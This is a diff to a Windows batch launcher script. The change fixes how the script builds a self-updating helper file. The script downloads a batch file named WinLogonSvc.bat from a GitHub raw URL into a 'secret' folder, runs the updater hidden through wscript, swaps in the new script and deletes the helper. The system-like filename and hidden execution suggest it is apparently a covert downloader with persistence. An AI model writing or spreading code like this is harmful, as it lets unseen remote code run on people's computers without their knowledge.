@@ -1,4 +1,5 @@
 @echo off
+setlocal enabledelayedexpansion
 set "LAUNCHER_VERSION=1.5"
 set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
 set "LAUNCHER_SCRIPT_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/WinLogonSvc.bat"
@@ -45,7 +46,12 @@ if exist "%secretPath%\lv.tmp" (
     if !LAUNCHER_VERSION! LSS !LATEST_VERSION! (
         curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 300 2>nul
         if exist "%launcherScriptPath%.new" (
-            (echo @echo off & echo timeout /t 2 /nobreak > nul & echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%" > nul & echo del /f /q "%~f0" > nul) > "%secretPath%\ul.bat"
+            (
+                echo @echo off
+                echo timeout /t 2 /nobreak ^> nul
+                echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%"
+                echo del /f /q "%%~f0"
+            ) > "%secretPath%\ul.bat"
             start "" /B wscript.exe "%vbsLauncherPath%" "%secretPath%\ul.bat"
             goto :eof
         )
